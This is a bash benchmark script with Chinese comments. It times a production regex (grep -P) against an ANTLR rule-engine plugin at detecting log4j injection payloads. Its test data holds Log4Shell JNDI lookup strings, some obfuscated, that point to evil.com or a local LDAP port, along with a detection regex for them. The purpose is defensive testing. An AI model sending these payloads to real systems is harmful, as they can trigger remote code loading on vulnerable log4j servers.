#!/usr/bin/env bash
# ============================================================
# log4j 场景：正则 vs 语法规则（ANTLR）性能对比
# ------------------------------------------------------------
# 同一批 log4j 载荷，测"单请求深检"的进程内成本：
#   * 正则侧：生产正则 + grep -P，单进程扫 N 行（N 份载荷），
#     得每请求平均耗时；
#   * 引擎侧：misc/bench_log4j_plugin 同进程连续调用
#     rule_check_text N 次，得每请求平均耗时（词法+滑窗+解析，
#     不含 fast-path 预筛）。
# 输出每请求 µs 与 engine/regex 倍数。
#
# 注意：
#   * 插件当前按 CMake 构建类型（Debug=-O0 / Release=-O3）编译，
#     Debug 数字偏保守；对比请统一构建类型。
#   * 正则未含请求解析/字符串提取等外围成本；引擎未含 fast-path。
#   * 对抗输入上 engine 受尝试/耗时预算（1024 次 / 5ms）封顶，
#     正则无预算，可能触发灾难性回溯。
#
# usage: bench_log4j.sh [engine_binary] [rules_dir]
# ============================================================
set -u

RULES="${2:-build/plugins}"
PLUGIN="$RULES/liblog4j_rules.so"
SRC_DIR="$(cd "$(dirname "$0")" && pwd)"

TMP=$(mktemp -d)
trap 'rm -rf "$TMP"' EXIT

g++ -O2 -std=c++17 "$SRC_DIR/bench_log4j_plugin.cc" -ldl -o "$TMP/bench_plugin" || exit 1
[ -f "$PLUGIN" ] || { echo "plugin not found: $PLUGIN"; exit 1; }

# 生产正则（与 misc/compare_log4j_regex.sh 一致）
PAT='\${((.*jndi:((ldap://)|(rmi://)).+)|(.*\${((ower)|(upper)):.+)|(.*\${.*:.*:-.+)|(.*\${date:.+))}'

# ------------------------------------------------------------
# 载荷集（label|payload|N）
# N 按载荷复杂度选择，保证每侧测量量纲稳定
# ------------------------------------------------------------
N_SHORT=30000
N_LONG=2000
N_ADV=500

long10k=$(printf 'a%.0s' $(seq 1 10000))'${date:x}'
nest100=''
for _ in $(seq 1 100); do nest100="${nest100}"'${a:'; done
nest100="${nest100}1"
for _ in $(seq 1 100); do nest100="${nest100}}"; done
repeat1000=$(printf '${jndi:ldap://x}%.0s' $(seq 1 1000))

P_CLASSIC='${jndi:ldap://127.0.0.1:1389/a}'
P_NESTED='${${lower:j}ndi:ldap://evil.com/a}'
P_ENV='${env:${jndi:ldap://evil.com/a}}'
P_BENIGN_JAVA='${java:version}'

CASES=(
  "classic-jndi|$P_CLASSIC|$N_SHORT"
  "nested-lower|$P_NESTED|$N_SHORT"
  "env-wrapped|$P_ENV|$N_SHORT"
  "benign-hello|hello world|$N_SHORT"
  "benign-java|$P_BENIGN_JAVA|$N_SHORT"
  "long-10k-date|$long10k|$N_LONG"
  "deep-nest-100|$nest100|$N_LONG"
  "repeat-1000-jndi|$repeat1000|$N_ADV"
)

time_regex() { # <payload> <n> -> stdout µs/req
    local payload="$1" n="$2" file start end ms
    file="$TMP/re.txt"
    for _ in $(seq 1 "$n"); do printf '%s\n' "$payload"; done > "$file"
    start=$(date +%s%N)
    timeout 60 grep -cP -- "$PAT" "$file" >/dev/null 2>&1
    rc=$?
    end=$(date +%s%N)
    ms=$(( (end - start) / 1000000 ))
    if [[ $rc == 124 ]]; then
        echo "TIMEOUT"
    else
        awk -v ms="$ms" -v n="$n" 'BEGIN { printf "%.3f", ms * 1000.0 / n }'
    fi
}

time_engine() { # <payload> <n> -> stdout µs/req
    local payload="$1" n="$2"
    local ns
    ns=$("$TMP/bench_plugin" "$PLUGIN" "$payload" "$n")
    awk -v ns="$ns" 'BEGIN { printf "%.3f", ns / 1000.0 }'
}

echo "== log4j 正则 vs ANTLR：每请求深检耗时（µs）=="
printf '%-20s %12s %12s %10s\n' "payload" "regex" "engine" "ratio"

for c in "${CASES[@]}"; do
    IFS='|' read -r label payload n <<< "$c"
    r=$(time_regex "$payload" "$n")
    e=$(time_engine "$payload" "$n")
    if [[ "$r" == "TIMEOUT" ]]; then
        ratio=">60s"
    else
        ratio=$(awk -v r="$r" -v e="$e" 'BEGIN { if (r > 0) printf "%.1fx", e / r; else printf "-" }')
    fi
    printf '%-20s %12s %12s %10s\n' "$label" "$r" "$e" "$ratio"
done

echo
echo "说明：engine 为插件深检成本（词法+滑窗+解析，预算 1024 次/5ms），"
echo "不含 fast-path 预筛；regex 为裸匹配（grep -P），不含请求外围处理。"
